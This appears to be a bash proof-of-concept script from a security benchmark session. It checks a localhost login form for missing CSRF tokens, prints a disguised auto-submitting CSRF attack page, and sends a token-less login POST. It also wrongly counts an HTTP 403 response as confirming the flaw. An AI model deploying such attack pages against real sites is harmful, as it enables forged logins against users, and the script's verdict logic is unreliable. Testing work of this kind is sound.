#!/bin/bash
# POC: Demonstrates CSRF vulnerability on login form by showing absence of CSRF tokens and creating a malicious CSRF attack form
# Target: ./repo
# Created: 2025-11-10T14:44:07.232Z
# Session: benchmark-XBEN-024-24-mht8yjhk

# CSRF Login Form Vulnerability POC
# This script demonstrates the absence of CSRF token protection on the login form
# and shows how an attacker can craft a CSRF attack

TARGET_URL="${1:-http://localhost:3000}"
LOGIN_ENDPOINT="${TARGET_URL}/login"

echo "[*] CSRF Login Form Vulnerability POC"
echo "[*] Target: $LOGIN_ENDPOINT"
echo ""

# Step 1: Fetch the login form and check for CSRF tokens
echo "[*] Step 1: Fetching login form from $LOGIN_ENDPOINT"
FORM_HTML=$(curl -s "$LOGIN_ENDPOINT")

if [ $? -ne 0 ]; then
    echo "[-] Error: Could not connect to $LOGIN_ENDPOINT"
    exit 1
fi

echo "[+] Successfully fetched login form"
echo ""

# Step 2: Check for CSRF token patterns
echo "[*] Step 2: Checking for CSRF token protection..."
echo ""

# Check for common CSRF token patterns
if echo "$FORM_HTML" | grep -qi "csrf"; then
    echo "[!] CSRF token field detected in form"
    echo "$FORM_HTML" | grep -i "csrf" | head -3
else
    echo "[-] NO CSRF token protection found!"
fi

echo ""

# Check for hidden input fields that might contain tokens
if echo "$FORM_HTML" | grep -qi 'type="hidden"'; then
    echo "[*] Hidden input fields found:"
    echo "$FORM_HTML" | grep -i 'type="hidden"'
else
    echo "[-] No hidden input fields (typical CSRF token location) found"
fi

echo ""

# Step 3: Demonstrate CSRF attack vector
echo "[*] Step 3: Demonstrating CSRF attack vector..."
echo ""
echo "[*] Creating malicious HTML file that exploits the CSRF vulnerability..."
echo ""

CSRF_ATTACK_HTML=$(cat <<'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Innocent Looking Page</title>
</head>
<body>
    <h1>Click here for free prizes!</h1>
    
    <!-- Hidden CSRF attack form -->
    <form id="csrf_attack" action="http://localhost:3000/login" method="POST" style="display:none;">
        <input type="hidden" name="username" value="attacker">
        <input type="hidden" name="password" value="malicious_attempt">
        <input type="submit" value="Click here">
    </form>
    
    <!-- Auto-submit the form when page loads -->
    <script>
        // Automatically submit the CSRF attack form
        document.getElementById('csrf_attack').submit();
    </script>
    
    <!-- Alternative CSRF vector using img tag (works with GET requests) -->
    <img src="http://localhost:3000/login?username=attacker&password=malicious" style="display:none;">
</body>
</html>
EOF
)

echo "[+] CSRF Attack Form Created:"
echo ""
echo "$CSRF_ATTACK_HTML"
echo ""

# Step 4: Test if form submission without CSRF token is accepted
echo "[*] Step 4: Testing if login form accepts POST without CSRF token..."
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$LOGIN_ENDPOINT" \
    -d "username=testuser&password=testpass" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -c /tmp/cookies.txt)

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "[*] HTTP Status Code: $HTTP_CODE"
echo ""

# Check if request was processed without CSRF token
if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "403" ]; then
    echo "[!] VULNERABILITY CONFIRMED:"
    echo "[!] POST request to login without CSRF token returned HTTP $HTTP_CODE"
    echo "[!] Server accepted request without CSRF token validation"
    echo ""
    echo "[!] This means an attacker can:"
    echo "    1. Create a malicious webpage"
    echo "    2. Trick a user into visiting it"
    echo "    3. Automatically submit login requests on behalf of the user"
    echo "    4. Perform account takeover or other malicious actions"
else
    echo "[-] Unexpected response code: $HTTP_CODE"
fi

echo ""
echo "[*] Vulnerability Summary:"
echo "    - CSRF tokens are NOT implemented on the login form"
echo "    - Server accepts POST requests without token validation"
echo "    - An attacker can forge login requests from any domain"
echo "    - Users visiting malicious websites can be compromised"
echo ""

exit 0